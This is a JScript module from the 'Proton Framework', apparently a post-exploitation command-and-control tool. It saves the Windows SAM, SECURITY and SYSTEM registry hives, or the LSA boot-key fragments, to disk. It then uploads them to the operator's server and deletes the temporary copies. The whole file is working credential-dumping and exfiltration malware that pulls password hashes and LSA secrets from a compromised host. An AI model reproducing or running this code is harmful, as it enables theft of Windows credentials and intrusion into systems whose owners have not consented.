//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

function GetSysKey()
{
    var jdpath = proton.file.getPath("~RPATH~\\42JD");
    var skew1path = proton.file.getPath("~RPATH~\\42Skew1");
    var gbgpath = proton.file.getPath("~RPATH~\\42GBG");
    var datapath = proton.file.getPath("~RPATH~\\42Data");

    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD" + " " + jdpath + " /y", false);
    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1" + " " + skew1path + " /y", false);
    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG" + " " + gbgpath + " /y", false);
    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);

    var data = proton.file.readBinary(jdpath);
    data += "~~~"+proton.file.readBinary(skew1path);
    data += "~~~"+proton.file.readBinary(gbgpath);
    data += "~~~"+proton.file.readBinary(datapath);

    var headers = {};
    headers["Task"] = "SysKey";

    if (proton.user.encoder != "936")
    {
        data = data.replace(/\\/g, "\\\\");
        data = data.replace(/\0/g, "\\0");
    }

    try
    {
        headers["encoder"] = proton.user.encoder();
    }
    catch (e)
    {
        headers["encoder"] = "1252";
    }

    proton.work.report(data, headers);
    proton.file.deleteFile(jdpath);
    proton.file.deleteFile(skew1path);
    proton.file.deleteFile(gbgpath);
    proton.file.deleteFile(datapath);
}

function DumpHive(name, uuid)
{
    var path = proton.file.getPath("~RPATH~\\" + uuid);

    proton.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);

    proton.http.upload(path, name, ~CERTUTIL~, "Task");
    proton.file.deleteFile(path);
}

try
{
    DumpHive("SAM", "42SAM");
    DumpHive("SECURITY", "42SECURITY");
    if (~GETSYSHIVE~)
    {
        DumpHive("SYSTEM", "42SYSTEM");
    }
    else
    {
        GetSysKey();
    }

    proton.work.report("Complete");
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
